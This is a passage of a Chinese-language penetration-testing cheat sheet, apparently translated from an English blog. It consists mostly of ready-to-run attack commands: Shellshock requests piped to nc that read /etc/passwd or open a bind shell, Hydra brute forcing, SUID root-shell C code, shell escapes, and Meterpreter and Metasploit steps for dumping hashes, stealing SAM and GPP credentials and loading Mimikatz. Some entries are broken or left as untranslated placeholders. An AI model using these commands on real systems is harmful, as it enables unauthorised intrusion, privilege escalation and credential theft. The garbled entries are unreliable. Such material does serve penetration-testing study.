title="搜索EXP"></a>搜索EXP</h3><p>安装exploit-db的本地备份:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">searchsploit –u</span><br><span class="line">searchsploit apache 2.2</span><br><span class="line">searchsploit &quot;Linux Kernel&quot;</span><br><span class="line">searchsploit linux 2.6 | grep -i ubuntu | grep local</span><br></pre></td></tr></table></figure><h3 id="在Kali上编译WIndows的exp"><a href="#在Kali上编译WIndows的exp" class="headerlink" title="在Kali上编译WIndows的exp"></a>在Kali上编译WIndows的exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download</span><br><span class="line">wine mingw-get-setup.exe</span><br><span class="line">select mingw32-base</span><br><span class="line">cd /root/.wine/drive_c/windows</span><br><span class="line">wget http://gojhonny.com/misc/mingw_bin.zip &amp;&amp; unzip mingw_bin.zip</span><br><span class="line">cd /root/.wine/drive_c/MinGW/bin</span><br><span class="line">wine gcc -o ability.exe /tmp/exploit.c -lwsock32</span><br><span class="line">wine ability.exe</span><br></pre></td></tr></table></figure><h3 id="交叉编译Exploits"><a href="#交叉编译Exploits" class="headerlink" title="交叉编译Exploits"></a>交叉编译Exploits</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -o output32 hello.c (32 bit)</span><br><span class="line">gcc -m64 -o output hello.c (64 bit)</span><br></pre></td></tr></table></figure><h3 id="利用通用漏洞"><a href="#利用通用漏洞" class="headerlink" title="利用通用漏洞"></a>利用通用漏洞</h3><h4 id="利用Shellshock漏洞"><a href="#利用Shellshock漏洞" class="headerlink" title="利用Shellshock漏洞"></a>利用Shellshock漏洞</h4><p>一个用来寻找和利用Shellshock漏洞的攻击</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/nccgroup/shocker</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./shocker.py -H TARGET  --command &quot;/bin/cat /etc/passwd&quot; -c /cgi-bin/status --verbose</span><br></pre></td></tr></table></figure><h5 id="cat-file-查看文件内容"><a href="#cat-file-查看文件内容" class="headerlink" title="cat file (查看文件内容)"></a>cat file (查看文件内容)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () &#123; :;&#125;; echo \$(&lt;/etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&quot; | nc TARGET 80</span><br></pre></td></tr></table></figure><h5 id="Shell-Shock-运行bind-shell"><a href="#Shell-Shock-运行bind-shell" class="headerlink" title="Shell Shock 运行bind shell"></a>Shell Shock 运行bind shell</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () &#123; :;&#125;; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&quot; | nc TARGET 80</span><br></pre></td></tr></table></figure><h5 id="Shell-Shock-反弹shell"><a href="#Shell-Shock-反弹shell" class="headerlink" title="Shell Shock 反弹shell"></a>Shell Shock 反弹shell</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 443</span><br></pre></td></tr></table></figure><h2 id="简单的本地Web服务器"><a href="#简单的本地Web服务器" class="headerlink" title="简单的本地Web服务器"></a>简单的本地Web服务器</h2><p>使用Python命令运行本地Web服务，在接受反向shell和攻击目标机器是很方便。</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>python -m SimpleHTTPServer 80</code></td><td>运行一个基本的 http 服务,接受反弹shell等情况下很棒</td></tr><tr><td><code>python3 -m http.server</code></td><td>运行一个基本的 Python3 http 服务</td></tr><tr><td><code>ruby -rwebrick -e &quot;WEBrick::HTTPServer.new(:Port =&gt; 80, :DocumentRoot =&gt; Dir.pwd).start&quot;</code></td><td>运行一个基本的ruby http 服务</td></tr><tr><td><code>php -S 0.0.0.0:80</code></td><td>运行一个基本的 PHP http 服务</td></tr></tbody></table><h2 id="挂载文件共享"><a href="#挂载文件共享" class="headerlink" title="挂载文件共享"></a>挂载文件共享</h2><p>怎样挂载 NFS / CIFS以进行 Windows 和Linux 的文件共享。</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>mount 192.168.1.1:/vol/share /mnt/nfs</code></td><td>挂载NFS共享到 <code>/mnt/nfs</code></td></tr><tr><td><code>mount -t cifs -o username=user,password=pass,domain=blah //192.168.1.X/share-name /mnt/cifs</code></td><td>挂载Windows CIFS / SMB 共享到 Linux 的 <code>/mnt/cifs</code> 。如果不直接在命令里带密码，可以在询问后输入，这样就不会在bash命令历史里存储明文密码</td></tr><tr><td><code>net use Z: \\win-server\share password  /user:domain\janedoe /savecred /p:no</code></td><td>使用命令行在Windows间挂载共享文件</td></tr><tr><td><code>apt-get install smb4k -y</code></td><td>在Kali上安装smb4k，方便从Linux的GUI查看SMB共享</td></tr></tbody></table><h2 id="HTTP-HTTPS-Web服务枚举"><a href="#HTTP-HTTPS-Web服务枚举" class="headerlink" title="HTTP / HTTPS Web服务枚举"></a>HTTP / HTTPS Web服务枚举</h2><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>nikto -h 192.168.1.1</code></td><td>对目标使用 nikto 进行扫描</td></tr><tr><td><code>dirbuster</code></td><td>使用GUI配置，命令行不好使</td></tr></tbody></table><h2 id="数据包侦测"><a href="#数据包侦测" class="headerlink" title="数据包侦测"></a>数据包侦测</h2><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>tcpdump tcp port 80 -w output.pcap -i eth0</code></td><td>将网卡eth0的80端口的流量导出到output.pcap</td></tr></tbody></table><h2 id="用户名枚举"><a href="#用户名枚举" class="headerlink" title="用户名枚举"></a>用户名枚举</h2><p>一些用来枚举目标系统用户名的手法。</p><h3 id="SMB-用户枚举"><a href="#SMB-用户枚举" class="headerlink" title="SMB 用户枚举"></a>SMB 用户枚举</h3><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>python /usr/share/doc/python-impacket-doc/examples/samrdump.py 192.168.XXX.XXX</code></td><td>枚举SMB用户</td></tr><tr><td><code>ridenum.py 192.168.XXX.XXX 500 50000 dict.txt</code></td><td>利用RID cycle枚举SMB用户</td></tr></tbody></table><h3 id="SNMP-用户枚举"><a href="#SNMP-用户枚举" class="headerlink" title="SNMP 用户枚举"></a>SNMP 用户枚举</h3><table><thead><tr><th>COMMAND</th><th>DESCRIPTION</th></tr></thead><tbody><tr><td>`snmpwalk public -v1 192.168.X.XXX 1</td><td>grep 77.1.2.25</td><td>cut -d” “ -f4`</td><td>枚举 SNMP 用户</td></tr><tr><td><code>python /usr/share/doc/python-impacket-doc/examples/samrdump.py SNMP 192.168.X.XXX</code></td><td>枚举 SNMP 用户</td></tr><tr><td><code>nmap -sT -p 161 192.168.X.XXX/254 -oG snmp_results.txt (then grep)</code></td><td>使用nmap搜索SNMP服务器，然后用grep过滤输出</td></tr></tbody></table><h2 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h2><h3 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h3><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>/usr/share/wordlists</code></td><td>Kali 的字典存放路径</td></tr></tbody></table><h2 id="爆破服务"><a href="#爆破服务" class="headerlink" title="爆破服务"></a>爆破服务</h2><h3 id="使用Hydra-爆破FTP"><a href="#使用Hydra-爆破FTP" class="headerlink" title="使用Hydra 爆破FTP"></a>使用Hydra 爆破FTP</h3><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX ftp -V</code></td><td>使用Hydra 爆破FTP</td></tr></tbody></table><h3 id="使用Hydra-爆破POP3"><a href="#使用Hydra-爆破POP3" class="headerlink" title="使用Hydra 爆破POP3"></a>使用Hydra 爆破POP3</h3><table><thead><tr><th>COMMAND</th><th>DESCRIPTION</th></tr></thead><tbody><tr><td><code>hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX pop3 -V</code></td><td>使用Hydra 爆破POP3</td></tr></tbody></table><h3 id="使用Hydra-爆破SMTP"><a href="#使用Hydra-爆破SMTP" class="headerlink" title="使用Hydra 爆破SMTP"></a>使用Hydra 爆破SMTP</h3><table><thead><tr><th>COMMAND</th><th>DESCRIPTION</th></tr></thead><tbody><tr><td><code>hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp -V</code></td><td>使用Hydra 爆破SMTP</td></tr></tbody></table><p>使用 <code>-t</code> 限制并发连接数，如 <code>-t 15</code></p><h2 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h2><p>渗透测试中用于密码破解的工具。</p><h3 id="John-The-Ripper-JTR"><a href="#John-The-Ripper-JTR" class="headerlink" title="John The Ripper - JTR"></a>John The Ripper - JTR</h3><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>john --wordlist=/usr/share/wordlists/rockyou.txt hashes</code></td><td>JTR 破解密码</td></tr><tr><td><code>john --format=descrypt --wordlist  /usr/share/wordlists/rockyou.txt hash.txt</code></td><td>JTR 使用字典爆破解密</td></tr><tr><td><code>john --format=descrypt hash --show</code></td><td>JTR 爆破解密</td></tr></tbody></table><h2 id="Windows-渗透测试命令"><a href="#Windows-渗透测试命令" class="headerlink" title="Windows 渗透测试命令"></a>Windows 渗透测试命令</h2><p>See <strong>Windows Penetration Testing Commands</strong>.【待原文补充】</p><h2 id="Linux-渗透测试命令"><a href="#Linux-渗透测试命令" class="headerlink" title="Linux 渗透测试命令"></a>Linux 渗透测试命令</h2><p>参考本站的<a href="https://highon.coffee/blog/linux-commands-cheat-sheet/" target="_blank" rel="noopener">Linux 命令速查表</a> ，该表提供了很多有用的命令。</p><h2 id="编译EXP"><a href="#编译EXP" class="headerlink" title="编译EXP"></a>编译EXP</h2><p>Some notes on compiling exploits.【待原文补充】</p><h3 id="判断C代码适用于Windows平台还是Linux"><a href="#判断C代码适用于Windows平台还是Linux" class="headerlink" title="判断C代码适用于Windows平台还是Linux"></a>判断C代码适用于Windows平台还是Linux</h3><p>通过<code>#include</code> 的文件来判定 </p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>process.h, string.h, winbase.h, windows.h, winsock2.h</code></td><td>Windows平台代码</td></tr><tr><td><code>arpa/inet.h, fcntl.h, netdb.h, netinet/in.h,  sys/sockt.h, sys/types.h, unistd.h</code></td><td>Linux平台代码</td></tr></tbody></table><h3 id="使用GCC编译Exploit"><a href="#使用GCC编译Exploit" class="headerlink" title="使用GCC编译Exploit"></a>使用GCC编译Exploit</h3><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>gcc -o exploit exploit.c</code></td><td>GCC基本用法</td></tr></tbody></table><h3 id="在64位的Kali上用GCC编译32位的EXP"><a href="#在64位的Kali上用GCC编译32位的EXP" class="headerlink" title="在64位的Kali上用GCC编译32位的EXP"></a>在64位的Kali上用GCC编译32位的EXP</h3><p>很方便地在64位的攻击机器上交叉编译32位的二进制文件。</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>gcc -m32 exploit.c -o exploit</code></td><td>在64位的Linux上交叉编译32位的二进制文件</td></tr></tbody></table><h3 id="在-Linux上编译可运行于Windows的exe文件"><a href="#在-Linux上编译可运行于Windows的exe文件" class="headerlink" title="在 Linux上编译可运行于Windows的exe文件"></a>在 Linux上编译可运行于Windows的exe文件</h3><table><thead><tr><th>COMMAND</th><th>DESCRIPTION</th></tr></thead><tbody><tr><td><code>i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe</code></td><td>在 Linux上生成Windows的exe</td></tr></tbody></table><h2 id="SUID-二进制"><a href="#SUID-二进制" class="headerlink" title="SUID 二进制"></a>SUID 二进制</h2><p>通常具有SUID的 C二进制文件要求以超级用户登陆shell，您可以按需更新UID / GID和shell。</p><p>下面是一些可用的shell：</p><h3 id="运行-bin-bash的SUID-C-Shell"><a href="#运行-bin-bash的SUID-C-Shell" class="headerlink" title="运行 /bin/bash的SUID C Shell"></a>运行 /bin/bash的SUID C Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int main(void)&#123;</span><br><span class="line">       setresuid(0, 0, 0);</span><br><span class="line">       system(&quot;/bin/bash&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="运行-bin-sh的SUID-C-Shell"><a href="#运行-bin-sh的SUID-C-Shell" class="headerlink" title="运行 /bin/sh的SUID C Shell"></a>运行 /bin/sh的SUID C Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int main(void)&#123;</span><br><span class="line">       setresuid(0, 0, 0);</span><br><span class="line">       system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="构建-SUID-Shell-二进制"><a href="#构建-SUID-Shell-二进制" class="headerlink" title="构建 SUID Shell 二进制"></a>构建 SUID Shell 二进制</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o suid suid.c</span><br></pre></td></tr></table></figure><p>32位</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -o suid suid.c</span><br></pre></td></tr></table></figure><h2 id="反向Shells"><a href="#反向Shells" class="headerlink" title="反向Shells"></a>反向Shells</h2><p>参考 <a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/" target="_blank" rel="noopener">反向 Shell 速查表</a> 。</p><h2 id="TTY-Shells"><a href="#TTY-Shells" class="headerlink" title="TTY Shells"></a>TTY Shells</h2><p>Tips / Tricks to spawn a TTY shell from a limited shell in Linux, useful for running commands like <code>su</code> from reverse shells.</p><p>一些模拟出TTY终端窗口以突破shell限制的技巧，便于从反向shell上执行类似 <code>su</code> 的特殊命令。</p><h3 id="用Python模拟-TTY-Shell的技巧"><a href="#用Python模拟-TTY-Shell的技巧" class="headerlink" title="用Python模拟 TTY Shell的技巧"></a>用Python模拟 TTY Shell的技巧</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo os.system(&apos;/bin/bash&apos;)</span><br></pre></td></tr></table></figure><h3 id="用sh模拟交互式shell"><a href="#用sh模拟交互式shell" class="headerlink" title="用sh模拟交互式shell"></a>用sh模拟交互式shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh -i</span><br></pre></td></tr></table></figure><h3 id="用Perl模拟-TTY-Shell"><a href="#用Perl模拟-TTY-Shell" class="headerlink" title="用Perl模拟 TTY Shell"></a>用Perl模拟 TTY Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec &quot;/bin/sh&quot;;</span><br><span class="line">perl —e &apos;exec &quot;/bin/sh&quot;;&apos;</span><br></pre></td></tr></table></figure><h3 id="用Ruby模拟-TTY-Shell"><a href="#用Ruby模拟-TTY-Shell" class="headerlink" title="用Ruby模拟 TTY Shell"></a>用Ruby模拟 TTY Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec &quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure><h3 id="用Lua-模拟TTY-Shell"><a href="#用Lua-模拟TTY-Shell" class="headerlink" title="用Lua 模拟TTY Shell"></a>用Lua 模拟TTY Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.execute(&apos;/bin/sh&apos;)</span><br></pre></td></tr></table></figure><h3 id="从Vi模拟TTY-Shell"><a href="#从Vi模拟TTY-Shell" class="headerlink" title="从Vi模拟TTY Shell"></a>从Vi模拟TTY Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:!bash</span><br></pre></td></tr></table></figure><h3 id="用NMAP模拟TTY-Shell"><a href="#用NMAP模拟TTY-Shell" class="headerlink" title="用NMAP模拟TTY Shell"></a>用NMAP模拟TTY Shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!sh</span><br></pre></td></tr></table></figure><h2 id="Metasploit-速查表"><a href="#Metasploit-速查表" class="headerlink" title="Metasploit 速查表"></a>Metasploit 速查表</h2><p>这是一个metasploit方便的速查手册。关于跳板技术可参看 <a href="https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/" target="_blank" rel="noopener">Meterpreter Pivoting</a> 。</p><h3 id="Meterpreter-Payloads"><a href="#Meterpreter-Payloads" class="headerlink" title="Meterpreter Payloads"></a>Meterpreter Payloads</h3><h3 id="Windows-反向meterpreter-payload"><a href="#Windows-反向meterpreter-payload" class="headerlink" title="Windows 反向meterpreter payload"></a>Windows 反向meterpreter payload</h3><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>set payload windows/meterpreter/reverse_tcp</code></td><td>Windows 反向tcp payload</td></tr></tbody></table><h3 id="Windows-VNC-Meterpreter-payload"><a href="#Windows-VNC-Meterpreter-payload" class="headerlink" title="Windows VNC Meterpreter payload"></a>Windows VNC Meterpreter payload</h3><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>set payload windows/vncinject/reverse_tcp`</code>set ViewOnly false`</td><td>Meterpreter Windows VNC Payload</td></tr></tbody></table><h3 id="Linux-反向Meterpreter-payload"><a href="#Linux-反向Meterpreter-payload" class="headerlink" title="Linux 反向Meterpreter payload"></a>Linux 反向Meterpreter payload</h3><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>set payload linux/meterpreter/reverse_tcp</code></td><td>Meterpreter Linux 反向Payload</td></tr></tbody></table><h2 id="Meterpreter速查表"><a href="#Meterpreter速查表" class="headerlink" title="Meterpreter速查表"></a>Meterpreter速查表</h2><p>有用的meterpreter 命令。</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>upload file c:\\windows</code></td><td>Meterpreter上传文件到 Windows 目标</td></tr><tr><td><code>download c:\\windows\\repair\\sam /tmp</code></td><td>Meterpreter 从 Windows 目标下载文件</td></tr><tr><td><code>execute -f c:\\windows\temp\exploit.exe</code></td><td>Meterpreter 在目标机器上执行.exe文件——用来执行上传的exp很方便</td></tr><tr><td><code>execute -f cmd -c</code></td><td>创建新的cmd shell通道</td></tr><tr><td><code>ps</code></td><td>Meterpreter显示进程</td></tr><tr><td><code>shell</code></td><td>Meterpreter获取目标shell</td></tr><tr><td><code>getsystem</code></td><td>Meterpreter尝试提权</td></tr><tr><td><code>hashdump</code></td><td>Meterpreter尝试导出目标机器上的哈希</td></tr><tr><td><code>portfwd add –l 3389 –p 3389 –r target</code></td><td>Meterpreter端口转发</td></tr><tr><td><code>portfwd delete –l 3389 –p 3389 –r target</code></td><td>Meterpreter删除端口转发</td></tr></tbody></table><h2 id="常用Metasploit-模块"><a href="#常用Metasploit-模块" class="headerlink" title="常用Metasploit 模块"></a>常用Metasploit 模块</h2><p>最常用的metasploit 模块。</p><h3 id="远程Windows-Metasploit-模块-exploits"><a href="#远程Windows-Metasploit-模块-exploits" class="headerlink" title="远程Windows Metasploit 模块(exploits)"></a>远程Windows Metasploit 模块(exploits)</h3><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>use exploit/windows/smb/ms08_067_netapi</code></td><td>MS08_067 Windows 2k, XP, 2003 远程攻击</td></tr><tr><td><code>use exploit/windows/dcerpc/ms06_040_netapi</code></td><td>MS08_040 Windows NT, 2k, XP, 2003 远程攻击</td></tr><tr><td><code>use exploit/windows/smb/ms09_050_smb2_negotiate_func_index</code></td><td>MS09_050 Windows Vista SP1/SP2 和Server 2008 (x86) 远程攻击</td></tr></tbody></table><h3 id="本地Windows-Metasploit-模块-exploits"><a href="#本地Windows-Metasploit-模块-exploits" class="headerlink" title="本地Windows Metasploit 模块(exploits)"></a>本地Windows Metasploit 模块(exploits)</h3><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>use exploit/windows/local/bypassuac</code></td><td>绕过 Windows 7 上的UAC</td></tr></tbody></table><h3 id="辅助Metasploit-模块"><a href="#辅助Metasploit-模块" class="headerlink" title="辅助Metasploit 模块"></a>辅助Metasploit 模块</h3><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>use auxiliary/scanner/http/dir_scanner</code></td><td>Metasploit HTTP 目录扫描</td></tr><tr><td><code>use auxiliary/scanner/http/jboss_vulnscan</code></td><td>Metasploit JBOSS 漏扫</td></tr><tr><td><code>use auxiliary/scanner/mssql/mssql_login</code></td><td>Metasploit MSSQL 认证扫描</td></tr><tr><td><code>use auxiliary/scanner/mysql/mysql_version</code></td><td>Metasploit MSSQL 版本扫描</td></tr><tr><td><code>use auxiliary/scanner/oracle/oracle_login</code></td><td>Metasploit Oracle 登陆模块</td></tr></tbody></table><h3 id="Metasploit-Powershell-模块"><a href="#Metasploit-Powershell-模块" class="headerlink" title="Metasploit Powershell 模块"></a>Metasploit Powershell 模块</h3><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>use exploit/multi/script/web_delivery</code></td><td>Metasploit powershell payload c传送模块</td></tr><tr><td><code>post/windows/manage/powershell/exec_powershell</code></td><td>Metasploit通过会话上传和执行 powershell脚本</td></tr><tr><td><code>use exploit/multi/http/jboss_maindeployer</code></td><td>Metasploit JBOSS 部署</td></tr><tr><td><code>use exploit/windows/mssql/mssql_payload</code></td><td>Metasploit MSSQL payload</td></tr></tbody></table><h3 id="Windows-后渗透Metasploit-模块"><a href="#Windows-后渗透Metasploit-模块" class="headerlink" title="Windows 后渗透Metasploit 模块"></a>Windows 后渗透Metasploit 模块</h3><p>Windows Metasploit 提权模块。</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>run post/windows/gather/win_privs</code></td><td>Metasploit 显示当前用户权限</td></tr><tr><td><code>use post/windows/gather/credentials/gpp</code></td><td>Metasploit 提取 GPP 保存的密码</td></tr><tr><td><code>load mimikatz -&gt; wdigest</code></td><td>Metasplit 加载 Mimikatz</td></tr><tr><td><code>run post/windows/gather/local_admin_search_enum</code></td><td>检查当前用户是否对域内其他机器有管理员权限</td></tr><tr><td><code>run post/windows/gather/smart_hashdump</code></td><td>自动化导出sam 文件，尝试提权等。</td></tr></tbody></table><h2 id="ASCII表速查"><a href="#ASCII表速查" class="headerlink" title="ASCII表速查"></a>ASCII表速查</h2><p>对Web应用渗透测试很有用，或者你被困在火星而需要和NASA通信。（梗自《火星救援》）</p><table><thead><tr><th>ASCII</th><th>字符</th></tr></thead><tbody><tr><td><code>x00</code></td><td>Null Byte 空字节</td></tr><tr><td><code>x08</code></td><td>BS  退格</td></tr><tr><td><code>x09</code></td><td>TAB 水平制表符</td></tr><tr><td><code>x0a</code></td><td>LF 换行</td></tr><tr><td><code>x0d</code></td><td>CR 回车</td></tr><tr><td><code>x1b</code></td><td>ESC</td></tr><tr><td><code>x20</code></td><td>SPC 空格</td></tr><tr><td><code>x21</code></td><td>!</td></tr><tr><td><code>x22</code></td><td>“</td></tr><tr><td><code>x23</code></td><td>#</td></tr><tr><td><code>x24</code></td><td>$</td></tr><tr><td><code>x25</code></td><td>%</td></tr><tr><td><code>x26</code></td><td>&amp;</td></tr><tr><td><code>x27</code></td><td>`</td></tr><tr><td><code>x28</code></td><td>(</td></tr><tr><td><code>x29</code></td><td>)</td></tr><tr><td><code>x2a</code></td><td>*</td></tr><tr><td><code>x2b</code></td><td>+</td></tr><tr><td><code>x2c</code></td><td>,</td></tr><tr><td><code>x2d</code></td><td>-</td></tr><tr><td><code>x2e</code></td><td>.</td></tr><tr><td><code>x2f</code></td><td>/</td></tr><tr><td><code>x30</code></td><td>0</td></tr><tr><td><code>x31</code></td><td>1</td></tr><tr><td><code>x32</code></td><td>2</td></tr><tr><td><code>x33</code></td><td>3</td></tr><tr><td><code>x34</code></td><td>4</td></tr><tr><td><code>x35</code></td><td>5</td></tr><tr><td><code>x36</code></td><td>6</td></tr><tr><td><code>x37</code></td><td>7</td></tr><tr><td><code>x38</code></td><td>8</td></tr><tr><td><code>x39</code></td><td>9</td></tr><tr><td><code>x3a</code></td><td>:</td></tr><tr><td><code>x3b</code></td><td>;</td></tr><tr><td><code>x3c</code></td><td>&lt;</td></tr><tr><td><code>x3d</code></td><td>=</td></tr><tr><td><code>x3e</code></td><td>&gt;</td></tr><tr><td><code>x3f</code></td><td>?</td></tr><tr><td><code>x40</code></td><td>@</td></tr><tr><td><code>x41</code></td><td>A</td></tr><tr><td><code>x42</code></td><td>B</td></tr><tr><td><code>x43</code></td><td>C</td></tr><tr><td><code>x44</code></td><td>D</td></tr><tr><td><code>x45</code></td><td>E</td></tr><tr><td><code>x46</code></td><td>F</td></tr><tr><td><code>x47</code></td><td>G</td></tr><tr><td><code>x48</code></td><td>H</td></tr><tr><td><code>x49</code></td><td>I</td></tr><tr><td><code>x4a</code></td><td>J</td></tr><tr><td><code>x4b</code></td><td>K</td></tr><tr><td><code>x4c</code></td><td>L</td></tr><tr><td><code>x4d</code></td><td>M</td></tr><tr><td><code>x4e</code></td><td>N</td></tr><tr><td><code>x4f</code></td><td>O</td></tr><tr><td><code>x50</code></td><td>P</td></tr><tr><td><code>x51</code></td><td>Q</td></tr><tr><td><code>x52</code></td><td>R</td></tr><tr><td><code>x53</code></td><td>S</td></tr><tr><td><code>x54</code></td><td>T</td></tr><tr><td><code>x55</code></td><td>U</td></tr><tr><td><code>x56</code></td><td>V</td></tr><tr><td><code>x57</code></td><td>W</td></tr><tr><td><code>x58</code></td><td>X</td></tr><tr><td><code>x59</code></td><td>Y</td></tr><tr><td><code>x5a</code></td><td>Z</td></tr><tr><td><code>x5b</code></td><td>[</td></tr><tr><td><code>x5c</code></td><td>\</td></tr><tr><td><code>x5d</code></td><td>]</td></tr><tr><td><code>x5e</code></td><td>^</td></tr><tr><td><code>x5f</code></td><td>_</td></tr><tr><td><code>x60</code></td><td>`</td></tr><tr><td><code>x61</code></td><td>a</td></tr><tr><td><code>x62</code></td><td>b</td></tr><tr><td><code>x63</code></td><td>c</td></tr><tr><td><code>x64</code></td><td>d</td></tr><tr><td><code>x65</code></td><td>e</td></tr><tr><td><code>x66</code></td><td>f</td></tr><tr><td><code>x67</code></td><td>g</td></tr><tr><td><code>x68</code></td><td>h</td></tr><tr><td><code>x69</code></td><td>i</td></tr><tr><td><code>x6a</code></td><td>j</td></tr><tr><td><code>x6b</code></td><td>k</td></tr><tr><td><code>x6c</code></td><td>l</td></tr><tr><td><code>x6d</code></td><td>m</td></tr><tr><td><code>x6e</code></td><td>n</td></tr><tr><td><code>x6f</code></td><td>o</td></tr><tr><td><code>x70</code></td><td>p</td></tr><tr><td><code>x71</code></td><td>q</td></tr><tr><td><code>x72</code></td><td>r</td></tr><tr><td><code>x73</code></td><td>s</td></tr><tr><td><code>x74</code></td><td>t</td></tr><tr><td><code>x75</code></td><td>u</td></tr><tr><td><code>x76</code></td><td>v</td></tr><tr><td><code>x77</code></td><td>w</td></tr><tr><td><code>x78</code></td><td>x</td></tr><tr><td><code>x79</code></td><td>y</td></tr><tr><td><code>x7a</code></td><td>z</td></tr></tbody></table><h2 id="CISCO-IOS-网际操作系统-命令"><a href="#CISCO-IOS-网际操作系统-命令" class="headerlink" title="CISCO IOS(网际操作系统) 命令"></a>CISCO IOS(网际操作系统) 命令</h2><p>收集一些有用的Cisco IOS 命令.</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>enable</code></td><td>进入使能模式</td></tr><tr><td><code>conf t</code></td><td>配置终端</td></tr><tr><td><code>(config)# interface fa0/0</code></td><td>配置 FastEthernet 0/0</td></tr><tr><td><code>(config-if)# ip addr 0.0.0.0 255.255.255.255</code></td><td>添加IP到 fa0/0</td></tr><tr><td><code>(config-if)# line vty 0 4</code></td><td>配置 vty line</td></tr><tr><td><code>(config-line)# login</code></td><td>登陆</td></tr><tr><td><code>(config-line)# password YOUR-PASSWORD</code></td><td>设置 